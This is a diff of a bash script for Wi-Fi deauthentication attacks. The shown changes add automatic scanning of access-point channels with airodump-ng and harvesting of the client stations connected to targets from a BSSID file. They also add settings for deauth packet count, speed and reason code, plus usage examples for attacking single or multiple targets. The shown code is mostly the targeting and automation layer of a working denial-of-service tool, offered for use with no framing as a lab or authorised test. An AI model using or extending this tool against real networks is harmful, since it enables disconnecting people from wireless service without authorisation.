@@ -1,27 +1,45 @@
 #!/bin/bash
 
 show_help() {
-    echo "Usage: ${0} [-i INTERFACE] [-a AP_BSSID] [-c CHANNEL] [-s STA_BSSID] [-t AP_BSSID_FILE] [-w WAIT] [-r REPEATS] [-n COUNT] [-x SPEED] [-R REASON] [-h]"
+    echo "Usage: ${0} [-i INTERFACE] [-b AP_BSSID] [-c CHANNEL] [-s STA_BSSID] [-f AP_BSSID_FILE] [-w WAIT] [-r REPEATS] [--pc COUNT] [--ps SPEED] [--rc REASON] [--sd STADURATION] [--st SCANTIME] [--fu FILTERUNASSOC] [--fbd FILTERBYDATA] [--wint WRITEINT] [--uch] [--ag] [--an] [--aq] [--kf] [-h] [--help]"
     echo
     echo "Options:"
-    echo "  -i INTERFACE    Specify the interface name to use."
-    echo "  -a AP_BSSID     Specify the target AP BSSID (mandatory for single target if not using -t)."
-    echo "  -c CHANNEL      Specify the channel number (mandatory if not using -t)."
-    echo "  -s STA_BSSID    Specify the target STA BSSID (mandatory for single target if not using -t)."
-    echo "  -t FILE         Specify the path to the file containing target AP BSSIDs and channels (one per line, format: BSSID,STATION,CHAN)."
-    echo "  -w WAIT         Specify the delay between runs in seconds (default: $DEFAULT_WAIT)."
-    echo "  -r REPEATS      Specify how many times the cycle should repeat (default: $DEFAULT_REPEATS)."
-    echo "  -p COUNT        Specify the number of deauthentication packet groups to send per run (default: $DEFAULT_COUNT)."
-    echo "  -x SPEED        Specify the packet speed (default: unlimited)."
-    echo "  -R REASON       Specify the deauthentication reason code (default: $DEFAULT_REASON)."
-    echo "  -h              Show this help menu."
+    echo "  -i INTERFACE      Specify the interface name to use."
+    echo "  -b AP_BSSID       Specify the target AP BSSID (mandatory for single target if not using -f)."
+    echo "  -c CHANNEL        Specify the channel number (mandatory if not using -f)."
+    echo "  -s STA_BSSID      Specify the target STA BSSID (mandatory for single target if not using -f)."
+    echo "  -f FILE           Specify the path to the file containing target AP BSSIDs and channels (one per line, format: BSSID,STATION,CHAN)."
+    echo "  -w WAIT           Specify the delay between runs in seconds (default: $DEFAULT_WAIT)."
+    echo "  -r REPEATS        Specify how many times the cycle should repeat (default: $DEFAULT_REPEATS)."
+    echo "  --pc COUNT        Specify the number of deauthentication packet groups to send per run (default: $DEFAULT_COUNT)."
+    echo "  --ps SPEED        Specify the packet speed (default: ${DEFAULT_SPEED})."
+    echo "  --rc REASON       Specify the deauthentication reason code (default: $DEFAULT_REASON)."
+    echo "  --sd STADURATION  Specify Duration for autogathering of stations. (default: ${DEFAULT_STADURATION}"
+    echo "  --ag              Autogather stations only. (MUST use --kf or the file will be deleted.)"
+    echo "  --uch             Update AP BSSID Files Channels only."
+    echo "  --an              Auto Update Channels and Stations + Attack (supply file format: BSSID,,)"
+    echo "  --aq              Auto Gather Stations + Attack."
+    echo "  --st SCANTIME     Specify the Scantime for channel update (default: ${DEFAULT_SCANTIME})."
+    echo "  --fu true         Specify Filter Unassociated client for channel update (default: ${DEFAULT_FILTERUNASSOC})."
+    echo "  --fbd INT         Specify Filter AP By Data Recieved for channel update (default: ${DEFAULT_FILTERBYDATA})."
+    echo "  --wint INT        Specify the write interval for channel update (default: ${DEFAULT_WRITEINT})."
+    echo "  --kf              Keep the generated file for --ag, --an, --aq or normal attack after use instead of deleting."
+    echo "  -h                Show this help menu."
+    echo " --help             Same as -h."
     echo
     echo "Default Values:"
-    echo "  WAIT           $DEFAULT_WAIT seconds"
-    echo "  REPEATS        $DEFAULT_REPEATS times"
-    echo "  COUNT          $DEFAULT_COUNT packets"
-    echo "  SPEED          $DEFAULT_SPEED packets/second"
-    echo "  REASON         $DEFAULT_REASON reason code."
+    echo "  WAIT              $DEFAULT_WAIT seconds"
+    echo "  REPEATS           $DEFAULT_REPEATS times"
+    echo "  COUNT             $DEFAULT_COUNT packets"
+    echo "  SPEED             $DEFAULT_SPEED packets/second"
+    echo "  REASON            $DEFAULT_REASON reason code"
+    echo "  STADURATION       $DEFAULT_STADURATION seconds"
+    echo "  AUTOGATHER        $AUTO_GATHER"
+    echo "  WRITEINT          $DEFAULT_WRITEINT"
+    echo "  FILTERBYDATA      $DEFAULT_FILTERBYDATA"
+    echo "  FILTERUNASSOC     $DEFAULT_FILTERUNASSOC"
+    echo "  SCANTIME          $DEFAULT_SCANTIME"
+    echo "  SCANTIME (AUTO)   $DEFAULT_STAUTO"  
     echo
     echo "Reason Codes:"
     echo "  1 - Unspecified reason."
@@ -34,88 +52,704 @@ show_help() {
     echo "  8 - Disassociated because sending STA is leaving or has left Basic Service Set."
     echo "  9 - STA requesting (re)association is not authenticated with responding STA."
     echo
-    echo "Target File Format for AP BSSID File:"
+    echo "Target File Format for AP BSSID File (Autogather):"
+    echo "NOTE: ,, IS A PLACEHOLDER DO NOT REMOVE IT"
     echo
-    echo "  BSSID,STATION,CHAN"
-    echo "  DE:AD:BE:EF:12:34,AA:BB:CC:DD:EE:FF,6"
+    echo "  BSSID,,CHAN"
+    echo "  DE:AD:BE:EF:12:34,,6"
+    echo
+    echo "Target File Format for AP BSSID File (Manual Gathering):"
+    echo
+    echo "  BSSID,STATION,CHANNEL"
+    echo "  00:11:22:33:44:55,66:11:22:33:55:44,10"
+    echo
+    echo "Auto All File format (update/get channels, gather stations, attack):"
+    echo "  BSSID,,"
+    echo "  00:11:22:33:44:55,,"
+    echo
     echo
     echo "Examples:"
     echo
     echo "Single Target AP, Single Channel:"
-    echo "  ${0} -i wlan1mon -a 00:11:22:33:44:55 -c 6"
+    echo "  ${0} -i wlan1mon -b 00:11:22:33:44:55 -c 6"
     echo
     echo "Single Target AP and Target STA, Single Channel:"
-    echo "  ${0} -i wlan1mon -a 00:11:22:33:44:55 -s aa:bb:cc:dd:ee:ff -c 6"
+    echo "  ${0} -i wlan1mon -b 00:11:22:33:44:55 -s aa:bb:cc:dd:ee:ff -c 6"
     echo
     echo "AP BSSID File, With Optional Defaults:"
-    echo "  ${0} -i wlan3mon -t targets.txt -w 30 -r 5"
+    echo "  ${0} -i wlan3mon -f targets.txt -w 30 -r 5"
+    echo
+    echo "AP BSSID File: Autogather"
+    echo "  ${0} -i wlan1mon -f ap-channel-only.txt --ag"
     echo
 }
 
 cleanup() {
+    trap - EXIT SIGINT SIGTERM
+
     echo -e "\nCleaning up..."
     pkill -P $$  
     wait
+    remove_update_temp
+    keep_file_after
+    if screen -list | grep -q "ch_update_${SCREENUID}"; then
+        screen -S "ch_update_${SCREENUID}" -X quit
+    fi
+    if screen -list | grep -q "autogather_${SCREENUID}"; then
+        screen -S "autogather_${SCREENUID}" -X quit
+    fi
     echo "Done."
     exit 0
 }
 
-trap cleanup SIGINT SIGTERM
+remove_update_temp() {
+    find /tmp -maxdepth 1 -type f -name  "$(basename "${0}").temp-*.csv" -exec rm {} +
+    find /tmp -maxdepth 1 -type f -name "airodump_capture-*.csv" -exec rm {} +
+}
+
+trap cleanup EXIT SIGINT SIGTERM
 
 DEFAULT_WAIT=30
 DEFAULT_REPEATS=1
-DEFAULT_COUNT=1
-DEFAULT_SPEED=1
-DEFAULT_REASON=3
+DEFAULT_COUNT=10
+DEFAULT_SPEED=5
+DEFAULT_REASON=0
 
-while getopts ":i:a:c:s:t:w:r:p:x:R:h" opt; do
-    case $opt in
-        i) IFACE=$OPTARG ;;
-        a) AP_BSSID=$OPTARG ;;
-        c) CHANNEL=$OPTARG ;;
-        s) STA_BSSID=$OPTARG ;;
-        t) AP_BSSID_FILE=$OPTARG ;;
-        w) WAIT_SECONDS=$OPTARG ;;
-        r) REPEATS=$OPTARG ;;
-        p) COUNT=$OPTARG ;;
-        x) SPEED=$OPTARG ;;
-        R) REASON=$OPTARG ;;
-        h) show_help
-           exit 0 ;;
-        \?) echo "Invalid option: -$OPTARG" >&2
-            show_help
-            exit 1 ;;
-        :) echo "Option -$OPTARG requires an argument." >&2
-           show_help
-           exit 1 ;;
-    esac
-done
+AUTO_GATHER=false
+AUTO_ALL=false
+AUTO_QUICK=false
+AUTO_QUICK_USED=false
+UPDATE_CH=false
+LOOP_START_DELAY=16
+KEEP_FILE=false
 
-if [ -z "$IFACE" ]; then
-    echo "[ERROR]: Interface is mandatory. Exiting." >&2
-    show_help
-    exit 1
-fi
+# Applies to Auto Normal too
+DEFAULT_STADURATION=40
+
+CDATE=$(date "+%H-%M-%S")
+SCREENUID=$(openssl rand -hex 2)
+
+# For ch update flag
+DEFAULT_SCANTIME=38
+DEFAULT_FILTERUNASSOC=true
+DEFAULT_FILTERBYDATA=0
+DEFAULT_WRITEINT=1
+UPDATE_FILE="/tmp/$(basename "${0}").temp"
+DEFAULT_STAUTO=65
+
+# Define valid channel ranges for 2.4GHz and 5GHz
+VALID_24GHZ_CHANNELS=(1 2 3 4 5 6 7 8 9 10 11 12 13 14)
+# If in the US add 177 to the list of valid 5GHz channels if your interface supports it
+VALID_5GHZ_CHANNELS=(36 40 44 48 52 56 60 64 100 104 108 112 116 120 124 128 132 136 140 144 149 153 157 161 165 173)
+
+IS_24GHZ_SUPPORTED=false
+IS_5GHZ_SUPPORTED=false
+
+# Delay to inspect any skipped APs and their reasons 
+SKIPPED_AP_DELAY=5
 
 WAIT_SECONDS=${WAIT_SECONDS:-$DEFAULT_WAIT}
 REPEATS=${REPEATS:-$DEFAULT_REPEATS}
 COUNT=${COUNT:-$DEFAULT_COUNT}
 SPEED=${SPEED:-$DEFAULT_SPEED}
 REASON=${REASON:-$DEFAULT_REASON}
+STADURATION=${STADURATION:-$DEFAULT_STADURATION}
+FILTERUNASSOC=${FILTERUNASSOC:-$DEFAULT_FILTERUNASSOC}
+FILTERBYDATA=${FILTERBYDATA:-$DEFAULT_FILTERBYDATA}
+WRITEINT=${WRITEINT:-$DEFAULT_WRITEINT}
+SCANTIME=${SCANTIME:-$DEFAULT_SCANTIME}
 
-# If not using a BSSID file, AP_BSSID is mandatory
-if [ -z "$AP_BSSID_FILE" ]; then
-    if [ -z "$AP_BSSID" ]; then
-        echo "[ERROR]: AP_BSSID (-a) is mandatory if not using a BSSID file. Exiting." >&2
-        show_help
+AG_FILE=""
+
+keep_file_after() {
+    if [ "${KEEP_FILE}" == false ]; then
+        if [ -n "${AP_BSSID_FILE}" ] && [ "${AP_BSSID_FILE}" != "${ORIGIN_AP_BSSID_FILE}" ]; then
+            rm -f "${AP_BSSID_FILE}" 2>/dev/null
+        fi        
+    fi
+#    if [ "${KEEP_FILE}" == false ] || [ "${KEEP_FILE}" == true ]; then
+#        if [ -n "${AG_FILE}" ] && [ "${ORIGIN_AP_BSSID_FILE}" != "${AG_FILE}" ]; then
+#            rm -f "${AG_FILE}" 2>/dev/null
+#        fi
+#    fi
+}
+
+detect_supported_bands() {
+    if [ -n "${IFACE}" ]; then
+        INTERFACE="${IFACE}"
+    fi
+
+    # Get the PHY index for the interface using iw dev
+    PHY=$(iw dev | awk -v iface="${INTERFACE}" '$1 ~ /^phy#/ { phy=$1 } $1 == "Interface" && $2 == iface { print phy; exit }' | tr -d '#')
+    if [ -z "${PHY}" ]; then
+        echo "[ERROR]: Unable to find phy index for interface ${INTERFACE}. Exiting."
         exit 1
     fi
 
-    if [ -z "$STA_BSSID" ]; then
-        echo "[WARNING]: No STA provided, removing -c flag from aireplay command."
-        STA_BSSID=""
+    # Get the supported frequencies for the PHY interface
+    SUPPORTED_FREQUENCIES=$(iw phy ${PHY} info | grep "Frequencies" -A 13)
+
+    # Check for 2.4GHz frequencies
+    for freq in $(seq 2412 5 2484); do
+        if echo "${SUPPORTED_FREQUENCIES}" | grep -q "$freq"; then
+            IS_24GHZ_SUPPORTED=true
+            break
+        fi
+    done
+
+    # Check for 5GHz frequencies
+    for freq in $(seq 5180 5 5865); do
+        if echo "${SUPPORTED_FREQUENCIES}" | grep -q "$freq"; then
+            IS_5GHZ_SUPPORTED=true
+            break
+        fi
+    done
+
+    if [ "${AUTO_QUICK}" = true ]; then
+
+        # Debug output
+        echo "2.4GHz Supported: ${IS_24GHZ_SUPPORTED}"
+        echo "5GHz Supported: ${IS_5GHZ_SUPPORTED}"
     fi
+}
+
+validate_bssid() {
+    local bssid="$1"
+    # Check if BSSID is in the correct format, case-insensitive
+    if [[ ! "$bssid" =~ ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ ]]; then
+        echo "[ERROR]: Invalid BSSID format: $bssid. BSSID should be in the format xx:xx:xx:xx:xx:xx with hex characters only." >&2
+        exit 1
+    fi
+}
+
+
+auto_all() {
+    if $AUTO_ALL; then
+        update_ch_check
+    fi
+    if $AUTO_QUICK; then
+        echo "Auto Quick Enabled. Skipping Channel Update."
+        auto_gather
+    fi
+}
+
+update_ch_check() {
+
+    # Check if auto is selected
+    if [ "${AUTO_ALL}" = true ]; then
+        echo "Automatic Update Options Config"
+        SCANTIME=${SCANTIME:-$DEFAULT_STAUTO}
+        FILTERUNASSOC=${FILTERUNASSOC:-$DEFAULT_FILTERUNASSOC}
+        WRITEINT=${WRITEINT:-$DEFAULT_WRITEINT}
+        FILTERBYDATA=${FILTERBYDATA:-$DEFAULT_FILTERBYDATA}
+        updatechannels
+    else
+
+        # Check if update is selected
+        if [ "${UPDATE_CH}" = true ]; then
+            echo "Update flag detected."
+            read -e -p "Enter value for SCANTIME (default: ${DEFAULT_SCANTIME}s): " SCANTIME
+            SCANTIME=${SCANTIME:-$DEFAULT_SCANTIME}
+
+            read -e -p "Enter value for FILTERBYDATA (default: ${DEFAULT_FILTERBYDATA}): " FILTERBYDATA
+            FILTERBYDATA=${FILTERBYDATA:-$DEFAULT_FILTERBYDATA}
+
+            read -e -p "Enter value for WRITEINT (default: ${DEFAULT_WRITEINT}s): " WRITEINT
+            WRITEINT=${WRITEINT:-$DEFAULT_WRITEINT}
+
+            read -e -p "Enter value for FILTERUNASSOC (default: ${DEFAULT_FILTERUNASSOC}): " FILTERUNASSOC
+            FILTERUNASSOC=${FILTERUNASSOC:-$DEFAULT_FILTERUNASSOC}
+
+            updatechannels "${SCANTIME}" "${FILTERBYDATA}" "${WRITEINT}" "${FILTERUNASSOC}"
+        fi
+    fi
+}
+
+
+updatechannels() {
+    if [ "${AUTO_ALL}" = true ]; then
+        AUTO_GATHER=true
+        detect_supported_bands
+        echo "Automatic Band Config and Channel Update."
+        if [ "${IS_24GHZ_SUPPORTED}" == true ] && [ "${IS_5GHZ_SUPPORTED}" == true ]; then
+            BAND="abg"
+        elif [ "${IS_24GHZ_SUPPORTED}" == true ] && [ "${IS_5GHZ_SUPPORTED}" == false ]; then
+            BAND="bg"
+        elif [ "${IS_5GHZ_SUPPORTED}" == true ] && [ "${IS_24GHZ_SUPPORTED}" == false ]; then
+            BAND="a"
+        else
+            echo "[ERROR]: No supported bands for selected interface."
+            exit 1
+        fi
+
+        # Run airodump-ng based on the detected or user-selected band
+        if [ "${FILTERUNASSOC}" == true ]; then
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" -a "${IFACE}" &
+                echo "Gathering BSSIDs and Channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update_${SCREENUID}" -X quit
+        else
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" "${IFACE}" &
+                sleep "${SCANTIME}"
+                echo "Gathering BSSIDs and Channels for ${SCANTIME}s. Please wait."
+                screen -S "ch_update_${SCREENUID}" -X quit
+        fi
+
+     else
+            # Perform a cleanup of temp_output just in case
+            remove_update_temp
+
+            echo "Updating input files channels. Please Wait.."
+            echo "SCANTIME VALUE:      ${SCANTIME}s"
+            echo "FILTERBYDATA VALUE:  ${FILTERBYDATA}"
+            echo "WRITEINT VALUE:      ${WRITEINT}s"
+            echo "FILTERUNASSOC VALUE: ${FILTERUNASSOC}"
+            echo "INTERFACE: ${IFACE}"
+
+            # Detect supported bands dynamically using the interface
+            detect_supported_bands
+
+            # Ask user for band selection if both are supported
+            if [ "${IS_24GHZ_SUPPORTED}" == true ] && [ "${IS_5GHZ_SUPPORTED}" == true ]; then
+                echo "Both 2.4GHz and 5GHz supported. Please select a band:"
+                echo "1. 2.4GHz"
+                echo "2. 5GHz"
+                echo "3. Both"
+                read -p "Enter your choice (1/2/3): " BAND_CHOICE
+
+                case "$BAND_CHOICE" in
+                    1)
+                        BAND="bg"
+                        echo "You selected 2.4GHz, scanning 2.4GHz."
+                        ;;
+                    2)
+                        BAND="a"
+                        echo "You selected 5GHz, scanning 5GHz."
+                        ;;
+                    3)
+                        BAND="abg"
+                        echo "You selected both 2.4GHz and 5GHz, scanning both bands."
+                        ;;
+                    *)
+                        echo "Invalid choice, defaulting to both bands."
+                        BAND="abg"
+                        ;;
+                esac
+        elif [ "${IS_24GHZ_SUPPORTED}" == true ]; then
+                BAND="bg"
+                echo "Only 2.4GHz supported, scanning 2.4GHz."
+        elif [ "${IS_5GHZ_SUPPORTED}" == true ]; then
+                BAND="a"
+                echo "Only 5GHz supported, scanning 5GHz."
+        else
+                echo "Error: No supported bands detected for the selected interface."
+                exit 1
+        fi
+
+        # Run airodump-ng based on the detected or user-selected band
+        if [ "${FILTERUNASSOC}" == true ]; then
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" -a "${IFACE}" &
+                echo "Gathering BSSIDs and Channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update_${SCREENUID}" -X quit
+        else
+                screen -dmS "ch_update_${SCREENUID}" airodump-ng --band "${BAND}" --output-format csv --write-interval "${WRITEINT}" -n "${FILTERBYDATA}" -w "${UPDATE_FILE}" "${IFACE}" &
+                echo "Gathering BSSIDs and Channels for ${SCANTIME}s. Please wait."
+                sleep "${SCANTIME}"
+                screen -S "ch_update_${SCREENUID}" -X quit
+        fi
+    fi
+    # Initiate file channel processing
+    process_channels
+}
+
+auto_gather() {
+    # Check auto capture STA is selected
+    if [ "$AUTO_GATHER" = true ]; then
+        if [ -z "$AP_BSSID_FILE" ]; then
+            echo "[ERROR]: -f (AP_BSSID_FILE) is mandatory with --ag, --an and --aq. Exiting."
+            exit 1
+        fi
+
+        detect_supported_bands
+
+        # Use a temporary output file to store results
+        OUTPUT_FILE="${AP_BSSID_FILE}.${CDATE}"
+        > "$OUTPUT_FILE"
+
+        # Array to store skipped APs
+        declare -a SKIPPED_APS
+
+        # Extract unique AP BSSIDs and Channels from the input file
+        mapfile -t AP_ENTRIES < <(awk -F"," '{print $1 "," $3}' "$AP_BSSID_FILE" | uniq)
+
+        for entry in "${AP_ENTRIES[@]}"; do
+            IFS=',' read -r ap_bssid channel <<< "$entry"
+
+            # Skip if channel is empty or non-numeric
+            if [[ -z "$channel" || ! "$channel" =~ ^[0-9]+$ ]]; then
+                SKIPPED_APS+=("$ap_bssid - Channel invalid or empty")
+                continue
+            fi
+
+            # Determine the band and validate the channel
+            if [[ "$channel" -le 14 ]]; then
+                if [[ "$IS_24GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_APS+=("$ap_bssid - 2.4GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_24GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_APS+=("$ap_bssid - Invalid 2.4GHz channel $channel")
+                    continue
+                fi
+            elif [[ "$channel" -ge 36 ]]; then
+                if [[ "$IS_5GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_APS+=("$ap_bssid - 5GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_5GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_APS+=("$ap_bssid - Invalid 5GHz channel $channel")
+                    continue
+                fi
+            else
+                SKIPPED_APS+=("$ap_bssid - Unknown band or invalid channel $channel")
+                continue
+            fi
+
+            # Set interface to correct channel
+            iwconfig "${IFACE}" channel "$channel"
+
+            # Run airodump-ng for the specified duration
+            screen -dmS "autogather_${SCREENUID}" airodump-ng -d "$ap_bssid" -c "$channel" --write /tmp/airodump_capture --output-format csv "$IFACE" &
+            echo "Gathering Stations on ${ap_bssid} for ${STADURATION}, Please wait."
+            sleep "$STADURATION"
+            screen -S "autogather_${SCREENUID}" -X quit
+
+            # Extract STAs associated with the AP
+            awk -F"," 'BEGIN {start=0} /Station MAC/ {start=1} start && $1 != "" && $1 != "Station MAC" {print $1}' /tmp/airodump_capture-01.csv | \
+            sed 's/\r//g' | sed '/^$/d' | while read -r sta_bssid; do
+                echo "$ap_bssid,$sta_bssid,$channel" >> "$OUTPUT_FILE"
+            done
+
+            # Clean up temporary files
+            find /tmp -maxdepth 1 -type f -name "airodump_capture-*.csv" -exec rm {} +
+        done
+
+        # Display skipped APs at the end
+        if [[ ${#SKIPPED_APS[@]} -gt 0 ]]; then
+            echo -e "\n[SUMMARY]: Skipped APs:"
+            for skipped in "${SKIPPED_APS[@]}"; do
+                echo "  $skipped"
+            done
+            echo "Continuing in ${SKIPPED_AP_DELAY} seconds..."
+            sleep "${SKIPPED_AP_DELAY}"
+        fi
+
+        echo "Auto-Gather complete. Results saved to ${OUTPUT_FILE}."
+        if [ "${AUTO_ALL}" = true ]; then
+            AUTO_ALL=false
+            AUTO_GATHER=false
+            UPDATE_CH=false
+            AUTO_QUICK=false
+            AP_BSSID_FILE="${AP_BSSID_FILE}.${CDATE}"
+            return 0
+        elif [ "${AUTO_QUICK}" = true ]; then
+            AUTO_GATHER=false
+            UPDATE_CH=false
+            AUTO_QUICK=false
+            AUTO_QUICK_USED=true
+            AP_BSSID_FILE="${AP_BSSID_FILE}.${CDATE}"
+            return 0 
+        else
+            exit 1
+        fi
+    fi
+}
+
+process_channels() {
+    # Extract and update channel numbers
+    while IFS=',' read -r bssid old_channel; do
+        # Extract new channel number from temp_output
+        new_channel=$(grep "${bssid}" "${UPDATE_FILE}"-01.csv | head -n 1 | cut -d ',' -f 4)
+
+        # Update channel number in input file
+        awk -F',' -v OFS=',' -v bssid="${bssid}" -v new_channel="${new_channel}" 'BEGIN { OFS = "," } $1 == bssid { gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3); gsub(/^[[:space:]]+|[[:space:]]+$/, "", new_channel); if ($3 != new_channel) $3 = new_channel; print } $1 != bssid' "$AP_BSSID_FILE" > temp && mv temp "$AP_BSSID_FILE"
+    done < "${AP_BSSID_FILE}"
+
+    echo "All BSSIDs channels within a detectable range have been updated."
+
+    # Check for auto gather stas
+    if [ "${AUTO_GATHER}" = true ]; then
+        auto_gather
+    else
+        exit 1
+    fi
+}
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -i) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -i"
+                exit 1
+            fi
+            IFACE="$2"
+            shift 2
+            ;;
+        -b) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -b"
+                exit 1
+            fi
+            AP_BSSID="$2"
+            validate_bssid "${AP_BSSID}"
+            shift 2
+            ;;
+        -c) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -c"
+                exit 1
+            fi
+            CHANNEL="$2"
+            shift 2
+            ;;
+        -s) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -s"
+                exit 1
+            fi
+            STA_BSSID="$2"
+            validate_bssid "${STA_BSSID}"
+            shift 2
+            ;;
+        -f) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -f"
+                exit 1
+            fi
+            AP_BSSID_FILE="$2"
+            ORIGIN_AP_BSSID_FILE="$2"
+            shift 2
+            ;;
+        -w) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -w"
+                exit 1
+            fi
+            WAIT_SECONDS="$2"
+            shift 2
+            ;;
+        -r) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for -r"
+                exit 1
+            fi
+            REPEATS="$2"
+            shift 2
+            ;;
+        --pc) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --pc"
+                exit 1
+            fi
+            COUNT="$2"
+            shift 2
+            ;;
+        --ps) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --ps"
+                exit 1
+            fi
+            SPEED="$2"
+            shift 2
+            ;;
+        --rc) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --rc"
+                exit 1
+            fi
+            REASON="$2"
+            shift 2
+            ;;
+        --sd) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --sd"
+                exit 1
+            fi
+            STADURATION="$2"
+            shift 2
+            ;;
+        --ag) AUTO_GATHER=true; shift ;;
+        --uch) UPDATE_CH=true; shift ;;
+        --an) AUTO_ALL=true; shift ;;
+        --aq) AUTO_QUICK=true; AUTO_GATHER=true; shift ;;
+        --st) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --st"
+                exit 1
+            fi
+            SCANTIME="$2"
+            shift 2
+            ;;
+        --wint) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --wint"
+                exit 1
+            fi
+            WRITEINT="$2"
+            shift 2
+            ;;
+        --fu) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --fu"
+                exit 1
+            fi
+            FILTERUNASSOC="$2"
+            shift 2
+            ;;
+        --fbd) 
+            if [[ -z "$2" ]]; then
+                echo "[ERROR]: Missing argument for --fbd"
+                exit 1
+            fi
+            FILTERBYDATA="$2"
+            shift 2
+            ;;
+        --kf) KEEP_FILE=true; shift ;;
+        -h|--help) show_help; exit 0 ;;
+        --) shift; break ;; # End of options
+        *) echo "Invalid option: $1" >&2; show_help; exit 1 ;;
+    esac
+done
+
+# Function to validate parameters
+validate_params() {
+    if [ -z "$IFACE" ]; then
+        echo "[ERROR]: Interface is mandatory. Exiting." >&2
+        exit 1
+    fi
+
+    # Check if -f (AP_BSSID_FILE) is being used along with other conflicting options
+    if [ -n "$AP_BSSID_FILE" ] && { [ -n "$AP_BSSID" ] || [ -n "$STA_BSSID" ] || [ -n "$CHANNEL" ]; }; then
+        echo "[ERROR]: -f (AP_BSSID_FILE) cannot be used with -b, -s, or -c. Exiting."
+        exit 1
+    elif [ -z "$AP_BSSID_FILE" ]; then
+        [ -z "$AP_BSSID" ] && echo "[ERROR]: -b (AP_BSSID) is mandatory. Exiting." && exit 1
+        [ -z "$CHANNEL" ] && echo "[ERROR]: -c (CHANNEL) is mandatory. Exiting." && exit 1
+    fi
+
+    # Validate Speed range
+    if [ "${SPEED}" -lt 1 ] || [ "${SPEED}" -gt 1024 ]; then
+        echo "[ERROR]: Speed must be in the range 1-1024. Exiting."
+        exit 1
+    fi
+
+    # Check INTERFACE is valid and exists
+    if iwconfig "${IFACE}" 2>&1 | grep -q "No such device"; then
+        echo "[ERROR]: The interface '${IFACE}' is not valid or does not exist."
+        exit 1
+    fi
+
+    # Check INTERFACE is in monitor mode
+    if ! iwconfig "${IFACE}" 2>&1 | grep -q "Mode:Monitor"; then
+        echo "[ERROR]: '${IFACE}' must be in monitor mode."
+        exit 1
+    fi
+
+}
+
+validate_channel_range() {
+    detect_supported_bands
+
+    # Validate BSSID_FILE
+    if [[ -n "$AP_BSSID_FILE" ]]; then
+        OUTPUT_FILE="${AP_BSSID_FILE}.${CDATE}"
+        > "$OUTPUT_FILE"  # Initialize/clear the file
+        declare -a SKIPPED_APS
+
+        mapfile -t AP_ENTRIES < <(awk -F"," '{print $1 "," $2 "," $3}' "$AP_BSSID_FILE" | uniq)
+
+        for entry in "${AP_ENTRIES[@]}"; do
+            IFS=',' read -r ap_bssid stas channel <<< "$entry"
+
+            if [[ -z "$channel" || ! "$channel" =~ ^[0-9]+$ ]]; then
+                SKIPPED_APS+=("$ap_bssid - Channel invalid or empty")
+                continue
+            fi
+
+            if [[ "$channel" -le 14 ]]; then
+                if [[ "$IS_24GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_APS+=("$ap_bssid - 2.4GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_24GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_APS+=("$ap_bssid - Invalid 2.4GHz channel $channel")
+                    continue
+                fi
+            elif [[ "$channel" -ge 36 ]]; then
+                if [[ "$IS_5GHZ_SUPPORTED" = false ]]; then
+                    SKIPPED_APS+=("$ap_bssid - 5GHz not supported")
+                    continue
+                elif [[ ! " ${VALID_5GHZ_CHANNELS[@]} " =~ " $channel " ]]; then
+                    SKIPPED_APS+=("$ap_bssid - Invalid 5GHz channel $channel")
+                    continue
+                fi
+            else
+                SKIPPED_APS+=("$ap_bssid - Unknown band or invalid channel $channel")
+                continue
+            fi
+
+            echo "$ap_bssid,$stas,$channel" >> "$OUTPUT_FILE"
+        done
+
+        # Keeps file consistent with only one CDATE
+        mv "${OUTPUT_FILE}" "${AP_BSSID_FILE}"
+        OUTPUT_FILE="${AP_BSSID_FILE}"
+
+        if [[ ${#SKIPPED_APS[@]} -gt 0 ]]; then
+            echo -e "\n[SUMMARY]: Skipped APs:"
+            for skipped in "${SKIPPED_APS[@]}"; do
+                echo "  $skipped"
+            done
+            echo "Continuing in ${SKIPPED_AP_DELAY} seconds..."
+            sleep "${SKIPPED_AP_DELAY}"
+        fi
+
+        echo "Validation complete. Results saved to ${OUTPUT_FILE}."
+    fi
+}
+
+# Validate Params
+validate_params
+
+# Check for update channels flag
+
+update_ch_check
+auto_all
+
+# Check for ch update first
+
+if [ "${UPDATE_CH}" == true ]; then
+    updatechannels
 fi
+
+# Call Func
+auto_gather
+
